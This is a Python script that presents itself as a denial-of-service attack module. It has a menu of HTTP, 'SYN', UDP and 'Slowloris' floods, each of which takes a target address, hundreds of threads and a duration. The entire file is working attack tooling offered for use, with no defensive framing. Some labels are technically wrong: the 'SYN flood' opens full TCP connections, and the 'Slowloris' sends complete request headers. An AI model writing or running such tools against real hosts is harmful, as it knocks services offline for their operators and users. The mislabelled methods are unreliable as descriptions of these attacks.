#!/usr/bin/env python3
# DOS Attack Module

import socket, requests, random, time, threading

def run():
    print("\n" + "="*60)
    print("DOS ATTACK MODULE")
    print("="*60)
    print("[1] HTTP Flood")
    print("[2] SYN Flood")
    print("[3] UDP Flood")
    print("[4] Slowloris")
    print("[5] Back")
    
    choice = input("> ").strip()
    
    if choice == '1':
        http_flood()
    elif choice == '2':
        syn_flood()
    elif choice == '3':
        udp_flood()
    elif choice == '4':
        slowloris()
    else:
        return

def http_flood():
    print("\n" + "="*60)
    print("HTTP FLOOD")
    print("="*60)
    url = input("Target URL: ").strip()
    threads = int(input("Threads [500]: ").strip() or "500")
    duration = int(input("Duration (seconds) [60]: ").strip() or "60")
    
    def flood():
        end = time.time() + duration
        while time.time() < end:
            try:
                requests.get(url, timeout=1)
            except:
                pass
    
    print(f"Starting HTTP flood on {url}")
    for i in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    time.sleep(duration)
    print("Attack completed!")

def syn_flood():
    print("\n" + "="*60)
    print("SYN FLOOD")
    print("="*60)
    ip = input("Target IP: ").strip()
    port = int(input("Port [80]: ").strip() or "80")
    threads = int(input("Threads [200]: ").strip() or "200")
    duration = int(input("Duration (seconds) [60]: ").strip() or "60")
    
    def flood():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((ip, port))
                s.close()
            except:
                pass
    
    print(f"Starting SYN flood on {ip}:{port}")
    for i in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    time.sleep(duration)
    print("Attack completed!")

def udp_flood():
    print("\n" + "="*60)
    print("UDP FLOOD")
    print("="*60)
    ip = input("Target IP: ").strip()
    port = int(input("Port [80]: ").strip() or "80")
    threads = int(input("Threads [500]: ").strip() or "500")
    duration = int(input("Duration (seconds) [60]: ").strip() or "60")
    
    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(65500)
        end = time.time() + duration
        while time.time() < end:
            try:
                s.sendto(data, (ip, port))
            except:
                pass
        s.close()
    
    print(f"Starting UDP flood on {ip}:{port}")
    for i in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    time.sleep(duration)
    print("Attack completed!")

def slowloris():
    print("\n" + "="*60)
    print("SLOWLORIS")
    print("="*60)
    ip = input("Target IP: ").strip()
    port = int(input("Port [80]: ").strip() or "80")
    threads = int(input("Threads [200]: ").strip() or "200")
    duration = int(input("Duration (seconds) [60]: ").strip() or "60")
    
    def flood():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(b"Host: " + ip.encode() + b"\r\n")
                s.send(b"Connection: keep-alive\r\n\r\n")
                time.sleep(5)
            except:
                pass
    
    print(f"Starting Slowloris on {ip}:{port}")
    for i in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    time.sleep(duration)
    print("Attack completed!")

if __name__ == "__main__":
    run()